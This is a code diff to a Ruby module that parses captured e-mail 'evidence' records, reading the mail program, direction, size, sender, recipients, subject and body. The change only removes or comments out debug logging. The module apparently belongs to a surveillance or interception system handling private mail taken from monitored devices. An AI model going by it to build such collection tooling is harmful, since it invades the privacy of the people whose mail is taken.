@@ -57,15 +57,11 @@ module MailEvidence
     # flags indica se abbiamo tutto il body o solo header
     version, flags, size, ft_low, ft_high = binary.read(20).unpack('L*')
 
-    trace :debug, "MAIL PARSING: #{version} #{flags}"
-
     case version
       when MAIL_VERSION
         ret[:data][:program] = 'outlook'
       when MAIL_VERSION2
         program = binary.read(4).unpack('L').first
-
-        trace :debug, "MAIL: program #{program} flags #{flags}"
 
         case program
           when PROGRAM_GMAIL
@@ -79,14 +75,9 @@ module MailEvidence
         end
         # direction of the mail
         ret[:data][:incoming] = (flags & MAIL_INCOMING != 0) ? 1 : 0
-
-        trace :debug, "MAIL: incoming #{ret[:data][:incoming]}"
-
       else
         raise EvidenceDeserializeError.new("invalid log version for MAIL")
     end
-
-    trace :debug, ret[:data].inspect
 
     ret[:data][:size] = size
     return ret
@@ -105,19 +96,21 @@ module MailEvidence
     # parse the mail to extract information
     m = Mail.read_from_string eml
 
-    trace :debug, "MAIL: EML size: #{eml.size}"
-    trace :debug, "MAIL: From: #{m.from.inspect}"
-    trace :debug, "MAIL: Rcpt: #{m.to.inspect}"
-    trace :debug, "MAIL: CC: #{m.cc.inspect}"
-    trace :debug, "MAIL: Subject: #{m.subject.inspect}"
+    #trace :debug, "MAIL: EML size: #{eml.size}"
+    #trace :debug, "MAIL: EML: #{eml}"
+    #trace :debug, "MAIL: From: #{m.from.inspect}"
+    #trace :debug, "MAIL: Rcpt: #{m.to.inspect}"
+    #trace :debug, "MAIL: CC: #{m.cc.inspect}"
+    #trace :debug, "MAIL: Subject: #{m.subject.inspect}"
 
     info[:data][:from] = parse_address(m.from)
     info[:data][:rcpt] = parse_address(m.to)
     info[:data][:cc] = parse_address(m.cc)
     info[:data][:subject] = m.subject.safe_utf8_encode unless m.subject.nil?
 
-    trace :debug, "MAIL: multipart #{m.multipart?} parts size: #{m.parts.size}"
-    trace :debug, "MAIL: parts #{m.parts.inspect}"
+    #trace :debug, "MAIL: multipart #{m.multipart?} parts size: #{m.parts.size}"
+    #trace :debug, "MAIL: parts #{m.parts.inspect}"
+    #trace :debug, "MAIL: body: #{m.body}"
 
     # extract body from multipart mail
     body = parse_multipart(m.parts) if m.multipart?
@@ -126,8 +119,8 @@ module MailEvidence
     body ||= {}
     body['text/plain'] ||= m.body.decoded.safe_utf8_encode unless m.body.nil?
 
-    trace :debug, "MAIL: text/plain #{body['text/plain']}"
-    trace :debug, "MAIL: text/html #{body['text/html']}"
+    #trace :debug, "MAIL: text/plain #{body['text/plain']}"
+    #trace :debug, "MAIL: text/html #{body['text/html']}"
 
     if body.has_key? 'text/html'
       info[:data][:body] = body['text/html']
